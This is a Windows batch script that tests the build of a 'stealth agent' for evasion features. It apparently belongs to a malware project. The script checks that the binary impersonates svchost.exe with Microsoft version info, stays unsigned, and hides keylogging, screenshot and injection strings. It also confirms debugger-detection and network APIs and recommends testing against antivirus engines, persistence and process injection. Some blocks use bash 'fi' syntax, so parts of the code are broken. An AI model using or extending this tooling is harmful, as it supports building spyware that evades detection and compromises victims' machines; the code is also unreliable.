@echo off
setlocal enabledelayedexpansion

:: Comprehensive Stealth Testing Script
:: Tests all implemented evasion and stealth features

echo ========================================
echo    Advanced Stealth Agent Test Suite
echo ========================================
echo.

set "TEST_DIR=%~dp0"
set "BUILD_DIR=%TEST_DIR%build"
set "RESULTS_FILE=%TEMP%\stealth_test_results_%RANDOM%.txt"

echo [INFO] Starting comprehensive stealth validation...
echo [INFO] Test results will be saved to: %RESULTS_FILE%
echo.

:: Initialize results file
echo Stealth Agent Test Results - %DATE% %TIME% > "%RESULTS_FILE%"
echo ================================================== >> "%RESULTS_FILE%"
echo. >> "%RESULTS_FILE%"

:: Test 1: Build System Validation
echo [TEST 1] Build System Validation
echo [TEST 1] Build System Validation >> "%RESULTS_FILE%"
if exist "%BUILD_DIR%\svchost.exe" (
    echo   ✓ Main executable built successfully
    echo   PASS: Main executable built successfully >> "%RESULTS_FILE%"
) else (
    echo   ✗ Main executable missing
    echo   FAIL: Main executable missing >> "%RESULTS_FILE%"
)

if exist "%BUILD_DIR%\msvcr120.dll" (
    echo   ✓ DLL version built successfully
    echo   PASS: DLL version built successfully >> "%RESULTS_FILE%"
) else (
    echo   ✗ DLL version missing
    echo   FAIL: DLL version missing >> "%RESULTS_FILE%"
)
echo.

:: Test 2: File Signature Analysis
echo [TEST 2] File Signature Analysis
echo [TEST 2] File Signature Analysis >> "%RESULTS_FILE%"
if exist "%BUILD_DIR%\svchost.exe" (
    powershell -Command "$sig = Get-AuthenticodeSignature '%BUILD_DIR%\svchost.exe'; if ($sig.Status -eq 'NotSigned') { Write-Host '  ✓ Binary is unsigned (good for stealth)' } else { Write-Host '  ! Binary is signed' }"
    
    :: Check for debug symbols
    dir "%BUILD_DIR%\*.pdb" >nul 2>&1
    if !errorlevel! equ 0 (
        echo   ! Debug symbols present - should be stripped
        echo   WARNING: Debug symbols present >> "%RESULTS_FILE%"
    ) else (
        echo   ✓ Debug symbols stripped
        echo   PASS: Debug symbols stripped >> "%RESULTS_FILE%"
    )
fi
echo.

:: Test 3: String Analysis
echo [TEST 3] String Analysis (Obfuscation Check)
echo [TEST 3] String Analysis >> "%RESULTS_FILE%"
if exist "%BUILD_DIR%\svchost.exe" (
    :: Check for obvious strings that should be obfuscated
    powershell -Command "$content = [System.IO.File]::ReadAllBytes('%BUILD_DIR%\svchost.exe'); $text = [System.Text.Encoding]::ASCII.GetString($content); if ($text -match 'http://|https://') { Write-Host '  ! Cleartext URLs found' } else { Write-Host '  ✓ No cleartext URLs detected' }"
    
    :: Check for common suspicious strings
    strings "%BUILD_DIR%\svchost.exe" 2>nul | findstr /i "keylog screenshot inject" >nul
    if !errorlevel! equ 0 (
        echo   ! Suspicious strings detected
        echo   WARNING: Suspicious strings detected >> "%RESULTS_FILE%"
    ) else (
        echo   ✓ No obvious suspicious strings
        echo   PASS: No obvious suspicious strings >> "%RESULTS_FILE%"
    )
fi
echo.

:: Test 4: Version Information Check
echo [TEST 4] Version Information Validation
echo [TEST 4] Version Information >> "%RESULTS_FILE%"
if exist "%BUILD_DIR%\svchost.exe" (
    powershell -Command "$version = (Get-ItemProperty '%BUILD_DIR%\svchost.exe').VersionInfo; if ($version.CompanyName -eq 'Microsoft Corporation') { Write-Host '  ✓ Legitimate company name' } else { Write-Host '  ! Invalid company name' }"
    powershell -Command "$version = (Get-ItemProperty '%BUILD_DIR%\svchost.exe').VersionInfo; if ($version.FileDescription -like '*Service*') { Write-Host '  ✓ Legitimate file description' } else { Write-Host '  ! Suspicious file description' }"
fi
echo.

:: Test 5: Entropy Analysis
echo [TEST 5] Entropy Analysis (Packing Detection)
echo [TEST 5] Entropy Analysis >> "%RESULTS_FILE%"
if exist "%BUILD_DIR%\svchost.exe" (
    :: Simple entropy check using PowerShell
    powershell -Command "$bytes = [System.IO.File]::ReadAllBytes('%BUILD_DIR%\svchost.exe'); $entropy = 0; $freq = @{}; foreach ($b in $bytes) { $freq[$b]++ }; foreach ($f in $freq.Values) { $p = $f / $bytes.Length; $entropy -= $p * [Math]::Log($p, 2) }; if ($entropy -gt 7.5) { Write-Host '  ! High entropy detected (may indicate packing)' } else { Write-Host '  ✓ Normal entropy levels' }"
fi
echo.

:: Test 6: Import Table Analysis
echo [TEST 6] Import Table Analysis
echo [TEST 6] Import Table Analysis >> "%RESULTS_FILE%"
if exist "%BUILD_DIR%\svchost.exe" (
    :: Check for suspicious imports
    powershell -Command "try { $pe = [System.Reflection.Assembly]::LoadFile('%BUILD_DIR%\svchost.exe'); Write-Host '  ✓ PE structure valid' } catch { Write-Host '  ! PE structure issues' }"
    
    :: Look for dynamic loading indicators
    strings "%BUILD_DIR%\svchost.exe" 2>nul | findstr /i "LoadLibrary GetProcAddress" >nul
    if !errorlevel! equ 0 (
        echo   ✓ Dynamic loading capabilities detected
        echo   PASS: Dynamic loading capabilities >> "%RESULTS_FILE%"
    ) else (
        echo   ! No dynamic loading detected
        echo   INFO: No dynamic loading detected >> "%RESULTS_FILE%"
    )
fi
echo.

:: Test 7: Network Capabilities
echo [TEST 7] Network Capabilities Check
echo [TEST 7] Network Capabilities >> "%RESULTS_FILE%"
strings "%BUILD_DIR%\svchost.exe" 2>nul | findstr /i "ws2_32 wininet winhttp" >nul
if !errorlevel! equ 0 (
    echo   ✓ Network libraries detected
    echo   PASS: Network libraries detected >> "%RESULTS_FILE%"
) else (
    echo   ! No network capabilities detected
    echo   WARNING: No network capabilities >> "%RESULTS_FILE%"
)
echo.

:: Test 8: Anti-Analysis Features
echo [TEST 8] Anti-Analysis Features
echo [TEST 8] Anti-Analysis Features >> "%RESULTS_FILE%"
strings "%BUILD_DIR%\svchost.exe" 2>nul | findstr /i "IsDebuggerPresent CheckRemoteDebugger" >nul
if !errorlevel! equ 0 (
    echo   ✓ Debugger detection capabilities
    echo   PASS: Debugger detection >> "%RESULTS_FILE%"
) else (
    echo   ! No debugger detection found
    echo   INFO: No debugger detection >> "%RESULTS_FILE%"
)
echo.

:: Test 9: File Size Analysis
echo [TEST 9] File Size Analysis
echo [TEST 9] File Size Analysis >> "%RESULTS_FILE%"
if exist "%BUILD_DIR%\svchost.exe" (
    for %%F in ("%BUILD_DIR%\svchost.exe") do (
        set "filesize=%%~zF"
        if !filesize! LSS 1048576 (
            echo   ✓ Reasonable file size: !filesize! bytes
            echo   PASS: File size !filesize! bytes >> "%RESULTS_FILE%"
        ) else (
            echo   ! Large file size: !filesize! bytes
            echo   WARNING: Large file size >> "%RESULTS_FILE%"
        )
    )
fi
echo.

:: Test 10: Deployment Package Check
echo [TEST 10] Deployment Package Validation
echo [TEST 10] Deployment Package >> "%RESULTS_FILE%"
if exist "%TEST_DIR%deploy\install.bat" (
    echo   ✓ Installation script present
    echo   PASS: Installation script present >> "%RESULTS_FILE%"
) else (
    echo   ✗ Installation script missing
    echo   FAIL: Installation script missing >> "%RESULTS_FILE%"
)

if exist "%TEST_DIR%deploy\uninstall.bat" (
    echo   ✓ Uninstallation script present
    echo   PASS: Uninstallation script present >> "%RESULTS_FILE%"
) else (
    echo   ✗ Uninstallation script missing
    echo   FAIL: Uninstallation script missing >> "%RESULTS_FILE%"
)
echo.

:: Summary
echo ========================================
echo           TEST SUMMARY
echo ========================================
echo.
echo Test results saved to: %RESULTS_FILE%
echo.
echo [INFO] Manual testing recommendations:
echo   1. Test in isolated VM environment
echo   2. Run against multiple AV engines
echo   3. Validate network communication
echo   4. Test persistence mechanisms
echo   5. Verify process injection capabilities
echo.
echo [WARNING] This is for educational/research purposes only
echo [WARNING] Ensure compliance with applicable laws
echo.

pause
exit /b 0